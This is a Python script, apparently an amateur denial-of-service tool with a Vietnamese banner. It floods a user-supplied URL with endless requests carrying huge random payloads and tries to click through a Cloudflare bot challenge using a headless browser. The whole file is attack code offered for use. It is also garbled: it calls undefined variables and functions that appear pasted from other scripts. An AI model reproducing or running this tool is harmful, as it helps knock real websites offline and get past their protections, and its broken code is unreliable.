import requests
import aiohttp
import asyncio
import random
import string
import ssl
from pyppeteer import launch
import os
os.system("clear")
import time
time.sleep(2)
print("\033[92m===================\n|| \033[91mdos \033[94msiêu \033[91mlỏ, \033[0mviết bởi dragoo ||\n\033[92m===================\033[0m\n\n")
url = input("url: ")
time.sleep(3)
print("đang dập")
def generate_random_payload():
    length = random.randint(1, 9999999)
    text_characters = string.ascii_letters + string.digits + string.punctuation
    payload = "".join(random.choice(text_characters) for i in range(length))
    return payload
async def attack(target):
    print("Check...")
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept-Encoding": "gzip, deflate, br",
        "User-agent": "hello, world!!!",
    }
    while True:
        try:
            x = requests.get(target, headers=headers, params={"payload": generate_random_payload()}, timeout=6)
        except requests.exceptions.RequestException as e:
            print("Error:", e)
        if x is not None and x.status_code == 200:
            session = aiohttp.ClientSession()
            context = ssl.create_default_context()
            async with session.head(target, cookies=x.cookies, ssl=context) as response:
                await response.text()
            test = requests.get(target)
            print("test", test.status_code)
            await asyncio.sleep(0.1)
            requests.post(target, headers=headers, params={"payload": generate_random_payload()})
            rsn = requests.get(target)
            print("status web", rsn)
        elif x is not None and x.status_code == 403:
            print("Block IP!!!")
            break
        elif x is not None and x.status_code >= 500:
            print("Die!!!")
            session = aiohttp.ClientSession()
            async with session.get(target) as response:
                await response.text()
                await response.release()
        if captcha == 'true':
            await ddgCaptcha(page)
        if precheck == 'true':
            checked_title = await page.title()
            if checked_title in ['Just a moment...', 'Checking your browser...', 'Access denied', 'DDOS-GUARD']:
                await page.close()
                await context.close()
                await browser.close()
        if sys.stdin in asyncio.select([sys.stdin], [], [], 0)[0]:
            pass
async def ditmemaybypassclouflare(url):
    browser = await launch()
    context = await browser.createIncognitoBrowserContext()
    page = await context.newPage()
    await page.goto(url)
    cloudflare = await page.evaluate('''() => {
        const button = document.querySelector('.big-button.pow-button');
        if (button) {
            const { x, y, width, height } = button.getBoundingClientRect();
            return { x: x + width / 2, y: y + height / 2 };
        } else {
            return false;
        }
    }''')
    if cloudflare:
        await page.hover('.big-button.pow-button')
        await page.mouse.click(cloudflare['x'], cloudflare['y'])
        await page.waitForTimeout(6000)
    await attack(url)
try:
    asyncio.run(ditmemaybypassclouflare(url))
except Exception as e:
    print("Error:", e)
